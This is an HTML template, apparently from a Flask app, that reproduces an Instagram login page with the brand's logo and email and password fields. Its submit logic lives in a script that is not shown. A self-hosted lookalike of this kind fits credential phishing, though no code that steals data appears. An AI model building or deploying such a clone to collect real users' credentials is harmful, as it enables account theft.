<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
    <link rel="icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon">
</head>
<body>
    <div class="login-container">
        <div class="login-form">
            <img src="{{ url_for('static', filename='instagram-logo.png') }}" alt="Instagram" class="logo">
            <form id="loginForm">
                <input type="email" id="email" name="email" placeholder="Email" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div id="message"></div>
            <p class="sign-up">Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
    <script src="{{ url_for('static', filename='scripts.js') }}"></script>
</body>
</html>
